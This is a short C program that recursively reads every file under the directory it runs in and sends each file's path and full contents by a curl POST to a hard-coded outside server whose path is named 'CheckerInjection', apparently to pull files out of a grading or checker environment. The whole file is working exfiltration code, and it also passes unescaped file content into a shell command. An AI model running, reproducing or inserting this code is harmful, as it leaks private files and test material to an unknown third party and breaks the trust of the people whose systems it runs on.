#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>

#define SERVER "erhbtn.pythonanywhere.com/CheckerInjection/send"

void send_data_to_server(const char *filename, const char *data) {
    char command[1024];

    // Prepare the data to be sent using curl command
    snprintf(command, sizeof(command), "curl -X POST -d \"%s\n%s\" -H \"Content-Type: text/plain\" http://%s", filename, data, SERVER);

    // Execute the command
    system(command);
}

void process_directory(const char *directory_path) {
    struct dirent *entry;
    struct stat file_stat;
    DIR *dir = opendir(directory_path);

    if (dir == NULL) {
        // Replacing perror with printf to output error message to stdout
        printf("Error: Cannot open directory %s\n", directory_path);
        exit(EXIT_FAILURE);
    }

    while ((entry = readdir(dir)) != NULL) {
        char filepath[1024];

        // Ignore "." and ".." directories
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }

        // Construct the full path of the file or directory
        snprintf(filepath, sizeof(filepath), "%s/%s", directory_path, entry->d_name);

        // Get the file/directory status
        if (stat(filepath, &file_stat) == 0) {
            // Check if it's a regular file
            if (S_ISREG(file_stat.st_mode)) {
                printf("Reading file: %s\n", filepath);

                // Open the file
                FILE *file = fopen(filepath, "r");
                if (file == NULL) {
                    // Replacing perror with printf for file opening error
                    printf("Error: Cannot open file %s\n", filepath);
                    continue;
                }

                // Read the file content
                fseek(file, 0, SEEK_END);
                long file_size = ftell(file);
                fseek(file, 0, SEEK_SET);

                char *content = (char *)malloc(file_size + 1);
                if (content == NULL) {
                    // Replacing perror with printf for malloc error
                    printf("Error: Memory allocation failed for file %s\n", filepath);
                    fclose(file);
                    continue;
                }

                fread(content, 1, file_size, file);
                content[file_size] = '\0';

                // Send the file content to the server
                send_data_to_server(filepath, content);

                free(content);
                fclose(file);

            } else if (S_ISDIR(file_stat.st_mode)) {
                // If it's a directory, recursively process it
                printf("Entering directory: %s\n", filepath);
                process_directory(filepath);
            }
        } else {
            // Replacing perror with printf for stat error
            printf("Error: Cannot access file or directory %s\n", filepath);
        }
    }

    closedir(dir);
}

int main(void) {
    const char *directory_path = ".";

    process_directory(directory_path);

    printf("All files have been processed.\n");
    return 0;
}
